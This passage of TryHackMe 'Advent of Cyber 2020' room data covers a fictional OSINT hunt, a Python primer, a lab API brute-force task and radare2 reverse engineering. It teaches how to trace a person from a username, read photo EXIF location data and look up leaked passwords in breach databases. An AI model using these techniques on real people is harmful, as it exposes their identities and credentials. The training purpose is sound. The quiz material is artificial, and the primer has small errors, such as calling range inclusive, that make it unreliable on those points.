Christmas!</p>\n<p>After you leave behind the\xa0coal, you can run\xa0tree | md5sum</p>\n<p>What is the MD5 hash output?</p>\n', 'hint': 'Be sure you make a coal file, not a directory!'}]}, {'taskTitle': '[Day 14] <span class="badge badge-soft-info size-16">OSINT</span> Where\'s Rudolph?', 'taskDesc': '<p style="text-align:center"><img src="https://www.pngkit.com/png/full/26-260976_rudolph-the-red-nosed-reindeer-png-image-rudolph.png" style="width:290.734px;height:290.734px" /><u><span style="font-size:18px"><br /></span></u></p><p style="text-align:center"><u><span style="font-size:18px">Day 14: Where\'s Rudolph?:</span></u></p><p></p><div style="text-align:center"><i>\'Twas the night before Christmas and Rudolph is lost</i></div><div style="text-align:center"><i>Now Santa must find him, no matter the cost</i></div><div style="text-align:center"><i>You have been hired to bring Rudolph back</i><i><br /></i></div><div style="font-style:italic;text-align:center"><i>How are your OSINT skills? Follow Rudolph\'s tracks...</i></div><div style="font-style:italic;text-align:center"><br /></div><div style="font-style:italic;text-align:center"><i><br /></i></div><div><span style="font-weight:bolder"><span style="font-size:18px">Task #1</span></span></div><div><span style="font-weight:bolder"><br /></span></div><div><i>While hunting and searching for any hints or clues</i></div><div><i>Santa uncovers some details and shares the news</i></div><div><i>Rudolph loved to use Reddit and browsed aplenty</i></div><div><i>His username was \'IGuidetheClaus2020\'</i></div><div><i><br /></i></div><div>Many OSINT investigations start with only a username.  A user\'s posting history can possibly lead to further information.  Sometimes, it\'s the smallest of clues that help us out.  Comb through Rudolph\'s Reddit history and answer questions #1-5 below.  You may need to use partial clues with a search engine to fill in the gaps.</div><div><br /></div><div><a href="https://www.youtube.com/watch?v=fmnxNEFVDII">Watch TheCyberMentor\'s video on solving this task!</a><br /></div><div><br /></div><div><span style="font-weight:bolder">Learning Objectives:</span></div><div><br /></div><div>1) Identify important information based on a user\'s posting history.</div><div>2) Utilize outside resources, such as search engines, to identify additional information, such as full names and additional social media accounts.</div><div><br /></div><div><span style="font-weight:bolder">Additional Resources:</span></div><div><span style="font-weight:bolder"><br /></span></div><div>While Rudolph\'s posting history is enough for us to identify that he has other social media accounts, sometimes we are not that lucky.  Great tools exist that allow us to search for user accounts across social media platforms.  Sites, such as <a href="https://namechk.com/" target="_blank">https://namechk.com/</a>, <a href="https://whatsmyname.app/" target="_blank">https://whatsmyname.app/</a>  and <a href="https://namecheckup.com/" target="_blank">https://namecheckup.com/</a><a href="https://namecheckup.com/" target="_blank"></a> will identify other possible accounts quickly for us.  Tools, such as <a href="https://github.com/WebBreacher/WhatsMyName" target="_blank">https://github.com/WebBreacher/WhatsMyName</a> and <a href="https://github.com/sherlock-project/sherlock" target="_blank">https://github.com/sherlock-project/sherlock</a> do this as well.  Simply enter a username, hit search, and comb through the results.  It\'s that easy!</div><div style="font-size:15px"><br /></div><p><span style="font-size:15px;white-space:pre-wrap"></span><span style="white-space:pre-wrap"></span></p><div style="box-sizing:border-box;text-align:left"><div style="box-sizing:border-box;font-size:15px"><span style="box-sizing:border-box;font-weight:bolder;font-size:18px">Task #2</span></div><div style="box-sizing:border-box;font-size:15px"><span style="box-sizing:border-box;font-weight:bolder"><br /></span></div><div style="box-sizing:border-box;font-size:15px"><i>Well it looks like you have uncovered Rudolph\'s Twitter</i></div><div style="box-sizing:border-box;font-size:15px"><i>Now we can read into all of his chitter</i></div><div style="box-sizing:border-box;font-size:15px"><i>Go through his profile and give it some views</i></div><div style="box-sizing:border-box;font-size:15px"><i>The deeper you dig, the better the clues</i></div><div style="box-sizing:border-box;font-size:15px"><i><br /></i></div><div style="box-sizing:border-box;font-size:15px">By finding another account belonging to our user, we open up the possibility of gathering even more information.  Utilize the information found on Rudolph\'s Twitter account to answer questions #6-11.</div><div style="box-sizing:border-box;font-size:15px"><br /></div><div style="box-sizing:border-box;font-size:15px"><b style="box-sizing:border-box;font-weight:bolder">Learning Objectives:</b></div><div style="box-sizing:border-box;font-size:15px"><b style="box-sizing:border-box;font-weight:bolder"><br /></b></div><div style="box-sizing:border-box;font-size:15px">1) Identify important information based on a user\'s posting history.</div><div style="box-sizing:border-box;font-size:15px">2) Use reverse image searching to identify where a photo was taken and possibly identify additional information, such as other user accounts.</div><div style="box-sizing:border-box;font-size:15px">3) Utilize image EXIF data to uncover critical details, such as exact photo location, camera make and model, the date the photo was taken, and more.</div><div style="box-sizing:border-box;font-size:15px">4) Use discovered emails to search through breached data to possibly identify user passwords, name, additional emails, and location.</div><div style="box-sizing:border-box;font-size:15px"><br /></div><div style="box-sizing:border-box;font-size:15px"><b style="box-sizing:border-box;font-weight:bolder">Additional Resources</b></div><div style="box-sizing:border-box;font-size:15px"><b style="box-sizing:border-box;font-weight:bolder"><br /></b></div><div style="box-sizing:border-box;font-size:15px">This task was created to identify common critical steps in an OSINT investigation.  Reverse image searching can help not only identify where an image was taken, but it can assist with identifying websites where that photo exists as well as similar photos (possibly from the same photoset), which can be incredibly useful in an investigation.  While Google Images is used in our example, other sites should also be utilized to be as thorough as possible.  No one site is perfect when it comes to reverse image searching (or any tool for that matter).  Sites like <a href="https://yandex.com/images/" target="_blank">https://yandex.com/images/</a>\xa0,\xa0<a href="https://tineye.com/" target="_blank">https://tineye.com/</a> and <a href="https://www.bing.com/visualsearch?FORM=ILPVIS" target="_blank">https://www.bing.com/visualsearch?FORM=ILPVIS</a> are great as well.  Additionally, do not neglect the possibility of EXIF data existing in an image.  While a lot of sites strip this data, not all do.  It never hurts to look and can provide a wealth of information when the data is still there.</div><div style="box-sizing:border-box;font-size:15px"><br /></div><div style="box-sizing:border-box;font-size:15px">Finally, breached data can be incredibly useful from an investigative standpoint.  Breach data does not just include passwords.  It often has full names, addresses, IP information, password hashes, and more.  We can often use this information to tie to other accounts.  For example, say we find an account with the email of v3ry1337h4ck3r@gmail.com.  If we search that email for breached data, we might find a password or hash associated with it.  If unique enough, we can search that password or hash in a breach database and use it to identify other possible accounts.  We can do the same with usernames, IPs, names, etc.  The possibilities are vast and one email address can lead to a slew of information.</div><div style="box-sizing:border-box;font-size:15px"><br /></div><div style="box-sizing:border-box;font-size:15px">Websites such as <a href="https://haveibeenpwned.com/" target="_blank">https://haveibeenpwned.com/</a> will help identify if an account has ever been breached and will, at a minimum, inform us if an account existed at one point.  However, it does not provide any password information.  Free sites such as <a href="http://scylla.sh/" target="_blank">http://scylla.sh/</a> will provide password information and are easy to search through.  The data on free sites can tend to be older and not up to date with the latest breach information, but these sites are still a powerful resource.   Lastly, paid sites such as <a href="https://dehashed.com/" target="_blank">https://dehashed.com/</a> offer up to date information and are easily searchable at affordable rates.</div><div style="box-sizing:border-box;font-size:15px"><br /></div><div style="box-sizing:border-box"><div style="box-sizing:border-box"><span style="box-sizing:border-box;font-size:18px"><b style="box-sizing:border-box;font-weight:bolder">Wrapping Up</b></span></div><div style="box-sizing:border-box"><span style="box-sizing:border-box;font-size:18px"><b style="box-sizing:border-box;font-weight:bolder"><br /></b></span></div><div style="box-sizing:border-box;font-size:15px"><i>It looks like finding Rudolph was a bit too easy</i></div><div style="box-sizing:border-box;font-size:15px"><i>His OPSEC would make any security pro queasy</i></div><div style="box-sizing:border-box;font-size:15px"><i>To the Windy City, Rudolph was tracked</i></div><div style="box-sizing:border-box;font-size:15px"><i>Christmas is saved, we brought Rudolph back</i></div></div></div>\n', 'taskType': 'none', 'taskNo': 16, 'taskCreated': '2020-11-12T02:48:42.769Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "<p>What URL will take me directly to Rudolph's Reddit comment history?<br /></p>\n", 'hint': ''}, {'questionNo': 2, 'question': '<p>According to Rudolph, where was he born?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': "<p>Rudolph mentions Robert.\xa0 Can you use Google to tell me Robert's last name?<br /></p>", 'hint': ''}, {'questionNo': 4, 'question': '<p>On what other social media platform might Rudolph have an account?<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': "<p>What is Rudolph's username on that platform?<br /></p>", 'hint': "Search Rudolph's Reddit username using the Twitter search feature"}, {'questionNo': 6, 'question': "<p>What appears to be Rudolph's favorite TV show right now?<br /></p>", 'hint': ''}, {'questionNo': 7, 'question': "<p>Based on Rudolph's post history, he took part in a parade.\xa0 Where did the parade take place?<br /></p>", 'hint': 'Save the images Rudolph posted on Twitter and upload them to https://images.google.com.'}, {'questionNo': 8, 'question': '<p>Okay, you found the city, but where specifically was one of the photos taken?<br /></p>', 'hint': 'Save the "higher resolution" image and check it\'s EXIF data here: http://exif.regex.info/ Answer Format: xx.xxxxxx, -xx.xxxxxx'}, {'questionNo': 9, 'question': '<p>Did you find a flag too?<br /></p>', 'hint': 'Check your EXIF data again :)'}, {'questionNo': 10, 'question': '<p>Has Rudolph been pwned? What password of his appeared in a breach?<br /></p>', 'hint': 'Navigate to: https://scylla.sh/\n\nSearch "email:rudolphthered@hotmail.com"'}, {'questionNo': 11, 'question': "<p>Based on all the information gathered.\xa0 It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile.\xa0 What are the street numbers of the hotel address?<br /></p>", 'hint': 'Look closely at your geo coordinates from your EXIF data.  Research the nearby hotel.'}]}, {'taskTitle': '[Day 15] <span class="badge badge-soft-dark size-16">Scripting</span> There\'s a Python in my stocking!', 'taskDesc': '<p style="text-align:center"><img src="https://i.imgur.com/yjfsuJW.png" alt style="width:50%" /></p>\n<h1></h1>\n<h1></h1>\n<p style="text-align:center"><a href="https://twitter.com/bee_sec_san" target="_blank">Created by Bee.</a></p><p>Have you ever wondered how the elves manage to keep up with building toys for so many people all around the world? Do you ever get sad and think "huh, with 7 billion people in the world and growing that means that each elf will be working non-stop to build toys! They\'ll never get a break!"</p>\n<p>Well, I have good news for you. Thanks to the magic of Santa, elves have machines that can build toys for them. This machine requires an elf to design a toy, and then describe how to make the toy in a scripting language.</p>\n<p>Scripting languages are special types of programming languages well suited for smaller, shorter programs such as the designs of a toy.</p>\n<p>This document is for any elves looking to work with Santa. Once you have completed this you\'ll be able to easily manufacture toys and use Santa\'s APIs!</p><a target="_blank" href="https://www.youtube.com/watch?v=lvcZRKO-B20">Watch DarkStar\'s video on solving this task!</a><br /><br />\n<h1>🎄 What is Python?</h1>\n<p>Python is an interpreted, high-level, general-purpose programming language. In short, Python is highly available on many computers already and is very easy to write.</p>\n<p>Python is available in all Linux operating systems, the TryHackMe Attack Box, Elven Toy Making Machinations, and Mac OS (but sadly, not Windows by default).<br />\n<br /></p>\n<h1>🎅 Installing &amp; Tooling</h1>\n<p>The\xa0<a href="https://tryhackme.com/room/tutorial">TryHackMe AttackBox</a>\xa0already has Python installed. To use it, load up a terminal and then type "python3". This will load an interactive editor for Python.</p>\n<p><br /><br />\nWe\'ll be creating files so we won\'t need to use the interactive editor. Instead, to run a file with Python execute: "python3 hello.py". We\'ll create hello.py next.<br />\nBut if you do not have Python installed, you\'ll need to install it. Follow this\xa0<a href="https://www.python.org/downloads/">link</a>\xa0and install Python for your system. Make sure to install a text editor such as\xa0<a href="https://code.visualstudio.com/">VS Code</a>\xa0which will help you write Python code.</p>\n<h1>🤶 Hello, World!</h1>\n<p>It is traditional for your first program to be "Hello, World!" so let\'s do it.</p><p><br />\nOpen a new file in VS Code (or your text editor of choice) and call it\xa0<em>hello.py</em>. The .py extension means it is a Python file. Now type:</p>\n<p><code>print("Hello, World!")</code></p>\n<p>Save the file, and then in a Terminal navigate to where the file is and run\xa0<em>python3 hello.py</em>\xa0You should see the output on your screen as "Hello, World!".</p>\n<p>Let\'s break down what each of these components means. Let\'s explain what this does:<br />\n<br /></p>\n<h2>👼 print()</h2>\n<p>Print is a function. We give it some text and it\'ll print it to the screen. We\'ll see functions a lot in Python. They are essential, as they allow us to re-use code.</p>\n<p>To define our own function, we use the def keyword.<br />\n<br /></p>\n<pre><code>def hello():\xa0 \xa0 <br />\xa0 \xa0 print("Hello, World!")\xa0<br /></code>\n</pre>\n<h2><span class="size" style="font-size:16px">We use a tab (or 4 spaces) inside functions to denote that the code belongs to that function. This is called a scope, and unfortunately, we won\'t go into it too much here. But I\'ll link some resources at the end which will.</span></h2>\n<h2>🧝\u200d♀️ "Hello, World!"</h2>\n<p>Is what we call a string (a string of characters). It\'s just text.</p><p><br /></p>\n<h1>🧝\u200d♂️ <b>Variables</b></h1>\n<p>Now in the last section, I said "String (a string of characters)".</p>\n<p>What does that mean? In programming, we need to have data types. Every bit of data has a type in common with it.\xa0<span class="size" style="font-size:1rem">You already know some.</span></p>\n<p><span class="size" style="font-size:1rem">If I said: 1, 2, 3, 4, 5, 6, 7, 8, 9 "Are these sentences?" No! They\'re numbers. See, you already know data types 😜</span></p>\n<p><span class="size" style="font-size:1rem">In Python, it\'s the same. We have some essential data types that hold things:</span><br />\n<br /></p>\n<ul>\n<li>String (a string of characters)</li>\n<li>Integer - a whole number (-50, 50, 60, 91)</li>\n<li>Float - a floating-point number (21.3, -5.1921)</li>\n<li>List - a list of items ([1, 2, 3], ["hi", 6, 7.91])</li>\n</ul>\n<p>And more....</p>\n<p><code>hello = "Hello, World!"</code></p>\n<p>We use the equals sign as an assignment operator. It assigns the value on the right-hand side to the bucket on the left.</p>\n<p>Now let\'s say we wanted to add this variable to another variable. A common misconception is that we take the bucket itself and use that. But in Python, we don\'t. We\xa0<strong>pass by reference</strong>. As in, we merely pass a location of the variable — we do not pass the variable itself. The alternative is to pass by value. This is very important to understand, as it can cause a significant amount of headaches later on.</p>\n<p>This is very important in toy making. We once had a small bug where an elf assigned different variables to the same toy. We thought we had 800 versions of the toy as we had 800 variables, but it turns out they were all pointing to the same toy! Luckily those children managed to get toys that year.</p>\n<h1>🦌 Operators</h1>\n<p>Let\'s talk about operators. An operator is something between 2 variables/values and does something to them. For example, the addition operator:</p>\n<p><code>x = 3 + 1 # x = 4\xa0</code></p>\n<p>Python supports many maths operators:</p>\n<p><code>3 + 1\xa0</code></p>\n<p><code>3 / 1 # divided by\xa0</code></p>\n<p><code>3 * 4 # times\xa0</code></p>\n<p><code>2 ** 2 # 2 to the power of 2\xa0</code></p>\n<p><code>2 % 3 # 2``mod 3\xa0</code><span class="size" style="font-size:1rem"></span></p>\n<p><span class="size" style="font-size:1rem">Now the cool thing, operators don\'t just work on numbers. They work on strings too. And lists. And dictionaries.</span></p>\n<p><span class="size" style="font-size:1rem"></span><code>[3, 2] + [6, 7] # [3, 2, 6, 7]\xa0</code></p>\n<p><code>"Hello, " + "World!" # "Hello, World!"\xa0</code></p>\n<h1>🍪 Boolean</h1>\n<p>The two values for the data type boolean are True and False. Much like Santa\'s list of Naughty and Nice, it is either True or False (never both).</p>\n<p>True and False are extremely valuable. In binary, 1 represents True and 0 represents False.\xa0<span class="size" style="font-size:1rem">Through these 2 values, we can represent all data on a computer, provided we are using logic gates. Those logic gates appear in Python as operators.</span></p>\n<p><span class="size" style="font-size:1rem">We\'ll go through one you may already know:</span></p>\n<p><span class="size" style="font-size:1rem"></span><code>True or False # True\xa0</code><span class="size" style="font-size:1rem"></span></p>\n<p><span class="size" style="font-size:1rem">The or operator returns true when either the left side or right side is True.</span></p>\n<p><span class="size" style="font-size:1rem">Let\'s quickly go through all the others</span></p>\n<p><code>True and True # True\xa0</code><span class="size" style="font-size:1rem"></span></p>\n<p><span class="size" style="font-size:1rem">This returns True if and only if both the left and right sides are True</span></p>\n<p><span class="size" style="font-size:1rem"></span><code>not True # False\xa0</code><span class="size" style="font-size:1rem"></span></p>\n<p><span class="size" style="font-size:1rem"></span><em>not</em><span class="size" style="font-size:1rem">\xa0negates the right-hand side expression. So the opposite of True is False.</span></p>\n<p><span class="size" style="font-size:1rem">We can negate the Or statement like so:</span></p>\n<p><span class="size" style="font-size:1rem"></span><code>not (True or False) # False\xa0</code><span class="size" style="font-size:1rem"></span></p>\n<p><span class="size" style="font-size:1rem">Now it only returns True when both sides of the or are False.</span><br />\n<br /></p>\n<h1>🥛 If Statements</h1>\n<p>If statements are one of the most powerful statements in all programming. We want to do something if a condition is met. If a child has been nice, they get a toy. Else they get coal!</p>\n<p>So for example, if the list is not empty:</p>\n<p><code>x = [6] if x: print("I run!")\xa0</code></p>\n<p>Because x is non-empty, it has a truthy value.\xa0\xa0<span class="size" style="font-size:1rem">Which means this reads as "If True" and it runs. If it read as "If False" it does not run.</span></p>\n<p><span class="size" style="font-size:1rem">If statements only run if the condition is True.</span></p>\n<p><span class="size" style="font-size:1rem">Now let\'s see it in action.</span></p>\n<p><span class="size" style="font-size:1rem"></span><code>name = input("What is your name? ")\xa0</code><span class="size" style="font-size:1rem"></span></p>\n<p><span class="size" style="font-size:1rem">We can take user input using the input() function</span><span class="size" style="font-size:1rem">. Now let\'s say we are a wide bouncer at Santa\'s Grotto. We only want to let people in that have a name in our special club. First, we need to create a list of names. Can you guess what we\'ll be using for this?</span></p>\n<p><span class="size" style="font-size:1rem"></span><code>names = ["Skidy", "DorkStar", "Ashu", "Elf"]\xa0</code><span class="size" style="font-size:1rem"></span></p>\n<p><span class="size" style="font-size:1rem">Great! And now if we have a string, such as Jabba, how do we check if the name is in the list?</span></p>\n<p><span class="size" style="font-size:1rem"></span><code>"Jabba" in names # False\xa0</code><span class="size" style="font-size:1rem"></span></p>\n<p><span class="size" style="font-size:1rem">Now we want to print a special little message if and only if the users inputted name appears in our list. We can do this with:</span></p>\n<p><span class="size" style="font-size:1rem"></span></p>\n<pre><code>names = ["Skidy", "DorkStar", "Ashu", "Elf"]\xa0\n<br />name = input("What is your name? ")\xa0\n<br />if name in names:<br />\xa0 \xa0 \xa0print("The Wide One has allowed you to come in.")\xa0</code></pre><p>\n</p><p><span class="size" style="font-size:1rem"><br /></span></p><p><span class="size" style="font-size:1rem">Now, what if their name does not appear in the list of names? We can use an else clause.</span><br />\n<br /></p>\n<pre><code>names = ["Skidy", "DorkStar", "Ashu", "Elf"]\xa0\n<br />name = input("What is your name? ")\xa0\n<br />if name in names:\xa0\n\xa0 \xa0 <br />\xa0 \xa0 print("The Wise One has allowed you to come in.")\xa0\n<br />else:\xa0\n\xa0 \xa0 <br />\xa0 \xa0 print("The Wise One has not allowed you to come in.")\n</code></pre>\n<p><span class="size" style="font-size:1rem">\xa0</span><br /></p>\n<h2>🎁\xa0One Line If Statements</h2>\n<p>We can also build one line if statements pretty nicely in Python.</p>\n<p><code>age = 12 name = "Jabba" if age == 12 else "Skidy" print(name) # \'Jabba\'\xa0</code><br />\n<br /></p>\n<h1>❄️ Loops</h1>\n<p>Loops allow us to perform the same code, repeatedly. For loops are best described how they are read:<br />\n<br /></p>\n<pre><code>names = ["Skidy", "DorkStar", "Ashu", "Elf"]\xa0\n<br />for name in names:<br />\xa0 \xa0 \xa0print(name)\n</code></pre>\n<p><br />For every name in the list of names, do something (in this case — print the name).</p>\n<p>For loops can iterate over the elements of any iterable. Let\'s look at a function which returns an iterable, range.</p>\n<p>Range returns a list of numbers in a range. So to loop between 1 and 9 we would do:</p>\n<p><code>range(1, 9)</code></p>\n<p>Range is inclusive, so 1 and 9 are included. Now to loop over this:\xa0<code>for i in range(1, 9): print(i)</code>\xa0Note: We often use <code>i</code> as the variable in a for loop as it stands for "item".<br />\n<br /></p>\n<h1>☃️ Libraries</h1>\n<p>You\'ve seen how to write code yourself, but what if we wanted to use other peoples code? This is called\xa0<em>using a library</em>\xa0where a\xa0<em>library</em>\xa0means a bunch of someone else\'s code. We can install libraries on the command line using the command:\xa0<code>pip install X</code>\xa0Where\xa0<em>X</em>\xa0is the library we wish to install. This installs the library from\xa0<a href="https://pypi.org/" target="_blank">PyPi which is a database of libraries.</a>\xa0Let\'s install 2 popular libraries that we\'ll need:</p>\n<ul>\n<li>Requests</li>\n<li>Beautiful Soup</li>\n</ul>\n<p><code>pip3 install requests beautifulsoup4\xa0</code></p>\n<p>Something very cool you can do with these 2 libraries is the ability to extract all links on a webpage.<br /></p>\n<pre><pre style="font-size:14px"><code># Import the libraries we downloaded earlier <br /># if you try importing without installing them, this step will fail <br />from bs4 import BeautifulSoup <br />import requests\xa0 <br /><br /># replace testurl.com with the url you want to use. <br /># requests.get downloads the webpage and stores it as a variable <br />html = requests.get(\'testurl.com\')\xa0 <br /><br /># this parses the webpage into something that beautifulsoup can read over <br />soup = BeautifulSoup(html, "lxml") <br /># lxml is just the parser for reading the html\xa0 <br /><br /># this is the line that grabs all the links # stores all the links in the links variable <br />links = soup.find_all(\'a href\')\xa0 <br />for link in links:\xa0 \xa0\xa0\xa0\xa0<br />\xa0 \xa0 # prints each link \xa0 \xa0 <br />\xa0 \xa0 print(link)</code></pre></pre><p>\nThis was a very short introduction to Python, but here are some more links if you wanted to learn more:</p>\n<ul>\n<li><a href="https://polymath.cloud/python/" target="_blank">Python Zero to Hero</a></li>\n<li><a href="https://realpython.com/python-modulo-operator/" target="_blank">Python Moduluo Operator in Practice</a></li>\n<li><a href="https://automatetheboringstuff.com/" target="_blank">Automate the Boring Stuff with Python</a></li></ul><p><u><br /></u></p><p><u>Code to analyse for Question 5:</u></p>\n<p><strong>x = [1, 2, 3]</strong></p>\n<p><strong>y = x</strong></p>\n<p><strong>y.append(6)</strong></p>\n<p><strong>print(x)</strong></p>\n<p style="text-align:center"><img src="https://i.imgur.com/TyAYHrb.png" alt style="width:50%" /></p>\n', 'taskType': 'none', 'taskNo': 17, 'taskCreated': '2020-11-12T02:48:52.106Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "<p>What's the output of True + True?<br /></p>\n", 'hint': ''}, {'questionNo': 2, 'question': "<p>What's the database for installing other peoples libraries called?<br /></p>", 'hint': ''}, {'questionNo': 3, 'question': '<p>What is the output of bool("False")?<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>What library lets us download the HTML of a webpage?<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>What is the output of the program provided in "Code to analyse for Question 5" in today\'s material?</p><p> (This code is located above the Christmas banner and below the links in the main body of this task)<br /></p>', 'hint': 'Add spaces in between items as per the answer formatting below:\n[x, x, x, x]'}, {'questionNo': 6, 'question': '<p>What causes the previous task to output that?<br /></p>', 'hint': 'The answer is above the 🦌 and below the 🧝\u200d♂️, in the variables section.'}]}, {'taskTitle': '[Day 16] <span class="badge badge-soft-dark size-16">Scripting</span> Help! Where is Santa?', 'taskDesc': '<p style="text-align:center"><img src="https://i.imgur.com/yjfsuJW.png" alt style="width:50%" /></p>\n<p style="text-align:center">Created by\xa0<a href="https://twitter.com/bee_sec_san">Bee</a>.</p><p style="text-align:left">\nOh no! Santa\xa0🎅 has taken off, leaving you -- the faithful elves behind! Can you help find Santa\'s location?</p><p style="text-align:left"><span style="font-size:1rem">Luckily, the elves are OSINT masters and remember a thing or two. Specifically, they remember:</span><br /></p>\n<ul>\n<li>Santa has a webpage at MACHINE_IP/static/index.html to help lost elves find their way home. Santa never told the elves what port number the webserver is on. Can you find out?!</li>\n<li>This webpage has a link somewhere on it, hidden away so anyone that isn\'t an elf can\'t find it.</li>\n<li>Santa\'s Sled has an API we can talk too. The key for the API is between 0 and 100, and it\'s an odd number. But be careful! After an unknown number of attempts, Santa\'s Sled will ban your IP address.\xa0</li></ul><p style="text-align:center">Deploy the machine that is running Santa\'s Sled and allow a couple of minutes for the target\xa0<span style="font-size:1rem">(MACHINE_IP)\xa0</span><span style="font-size:1rem">to start up. Using your Python skills from Day 15 to find the correct key for the API.</span></p><p style="text-align:center"><span style="font-size:1rem"><a href="https://www.youtube.com/watch?v=0AQHBrxYnqI" target="_blank">Watch John Hammonds video on solving this task!</a></span></p><ul>\n</ul>\n<p style="text-align:center"><img src="https://i.imgur.com/TyAYHrb.png" alt style="width:50%" /></p>\n', 'taskType': 'vm', 'taskNo': 18, 'taskCreated': '2020-11-12T02:48:58.353Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fea859b3c1d5c6512da9d31', 'questions': [{'questionNo': 1, 'question': '<p>What is the port number for the web server?<br /></p>\n', 'hint': ''}, {'questionNo': 2, 'question': '<p>Without using enumerations tools such as Dirbuster, what is the directory for the API?\xa0 (without the API key)<br /></p>', 'hint': '/******/\n'}, {'questionNo': 3, 'question': '<p>Where is Santa right now?<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': "<p>Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa's Sled will block you.\xa0</p><p>To unblock yourself, simply terminate and re-deploy the target instance (MACHINE_IP)</p>", 'hint': ''}]}, {'taskTitle': '[Day 17] <span class="badge badge-soft-purple size-16">Reverse Engineering</span> ReverseELFneering', 'taskDesc': '<p></p><p></p><p><span style="font-size:18px">\ufeff</span><img src="https://i.imgur.com/kd2ZbQT.png" style="text-align:center;width:319px;height:291.222px" /><br /></p><p><u><span style="font-size:18px">1. Story.</span></u></p><p>McSkidy has never really touched low-level languages - this is something they must learn in their quest to defeat the Christmas monster.</p><p><a href="https://www.youtube.com/watch?v=5X5SHprLHts" target="_blank">Follow along with Darkstar7474 and solve Day 17!</a><span style="font-size:24px"></span></p><hr /><p><u>2. Introduction to x86-64 Assembly</u><br /></p><p>Computers execute machine code, which is encoded as bytes, to carry out tasks on a computer. Since different computers have different processors, the machine code executed on these computers is specific to the processor. In this case, we’ll be looking at the Intel x86-64 instruction set architecture which is most commonly found today. Machine code is usually represented by a more readable form of the code called assembly code. This machine is code is usually produced by a compiler, which takes the source code of a file, and after going through some intermediate stages, produces machine code that can be executed by a computer. </p><p>Without going into too much detail, Intel first started out by building a 16-bit instruction set, followed by 32 bit, after which they finally created 64 bit. All these instruction sets have been created for backward compatibility, so code compiled for 32-bit architecture will run on 64-bit machines. As mentioned earlier, before an executable file is produced, the source code is first compiled into assembly(.s files), after which the assembler converts it into an object program(.o files), and operations with a linker finally make it an executable.\xa0</p><p><span style="font-size:1rem">The best way to actually start explaining assembly is by diving in. We’ll be using </span><code>radare2</code><span style="font-size:1rem"> to do this - <a href="https://github.com/radareorg/radare2" target="_blank">radare2</a> is a framework for reverse engineering and analysing binaries. It can be used to disassemble binaries(translate machine code to assembly, which is actually readable) and debug said binaries(by allowing a user to step through the execution and view the state of the program).</span></p><hr /><p><span style="font-size:1rem">Luckily for us, everything we need has been provided to you via an Instance that you can deploy and log into:</span></p><ol><li>Press the "Deploy" button on the top-right of this task</li><li>Wait for the IP address of the target Instance to display</li><li>Log into your Instance using the following information:</li></ol><p style="text-align:left"><b>IP Address:</b> <code>MACHINE_IP</code> </p><p style="text-align:left"><b>Username:</b> elfmceager</p><p style="text-align:left"><b>Password:</b> adventofcyber</p><hr style="text-align:left" /><p></p><p>Let\'s proceed to run through how Radare2 works exactly. Although you shouldn\'t do this if the program is unknown, it is safe for us to execute to see what <i>should</i>\xa0be happening like so:</p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/1.png" style="width:1028.37px;height:92.243px" /><i><br /></i></p><p style="text-align:center"><i>The above program shows that there are 3 variables(<b>a</b>,<b> b</b>, <b>c</b>) where <b>c</b> is the sum of <b>a</b> <b>and\nb</b>.\xa0</i></p><p style="text-align:left">Time to see what’s happening under the hood! <b>Run</b> the command\n<code>r2 -d ./file1</code><br /></p><p style="text-align:left">This will open the binary in debugging mode. Once the binary is open, one of the first\nthings to do is ask r2 to analyze the program, and this can be done by typing in: <code>aa</code>\n</p><p style="text-align:left"><b>Note, when using the </b><code>aa</code><b> command in radare2, this may take between 5-10 minutes depending on your system.</b></p><p style="text-align:left">Which is the most common analysis command. It analyses all symbols and entry points in\nthe executable.\nThe analysis, in this case, involves extracting function names, flow control information, and\nmuch more! r2 instructions are usually based on a single character, so it is easy to get\nmore information about the commands.</p><p style="text-align:left">I.e. For general help, we can run: <code>?</code> or if we wish to understand more about a specific feature, we could provide <code>a?</code></p><p style="text-align:left"><span style="font-size:18px"><u>3. Computer says...Done?!</u></span></p><p style="text-align:left"><span style="font-size:1rem">Once the analysis is complete, you would want to know where to start analysing from -\nmost programs have</span><span style="font-size:1rem">\xa0an entry point defined as main. To find a list of the functions run: </span><code>afl</code></p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/2.png" style="width:893.226px;height:295.281px" /><br /></p><span style="font-size:18px">\n</span><div style="text-align:center"></div><p></p><p style="text-align:center"><b>Note that memory addresses may be different on your computer.\xa0</b></p><p style="text-align:left"><span style="font-size:1rem"><br /></span></p><p style="text-align:left">As seen here, there actually is a function at main. Let’s examine the assembly code at\nmain by running the command\n<code>pdf @main</code>\nWhere <b>pdf</b> means <b>p</b>rint <b>d</b>isassembly <b>f</b>unction. Doing so will give us the following view:</p><p style="text-align:left"></p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/3.png" style="width:1049.68px;height:270.333px" /><br /></p><div style="text-align:center"><br /></div><div style="text-align:center"><br /></div><div style="text-align:left"><span style="font-size:18px"><u>3. Register me this, register me that...</u></span></div><span style="font-size:18px">The core of assembly language involves using registers to do the following:\xa0</span><p></p><ul><li style="text-align:left"><span style="font-size:1rem">Transfer data between memory and register, and vice versa</span></li><li style="text-align:left"><span style="font-size:1rem"> Perform arithmetic operations on registers and data</span></li><li style="text-align:left"><span style="font-size:1rem">Transfer control to other parts of the program\nSince the architecture is x86-64, the registers are 64 bit and Intel has a list of 16 registers:</span></li></ul><table class="table table-bordered"><tbody><tr><td>Initial Data Type</td><td>Suffix</td><td>Size (bytes)</td></tr><tr><td>Byte</td><td>b</td><td>1</td></tr><tr><td>Word</td><td>w</td><td>2</td></tr><tr><td>Double Word</td><td>\xa0l<br /></td><td>4</td></tr><tr><td>Quad</td><td>q</td><td>8</td></tr><tr><td>Single Precision<br /></td><td>s</td><td>4</td></tr><tr><td>Double Precision<br /></td><td>l<br /></td><td>8</td></tr></tbody></table><p 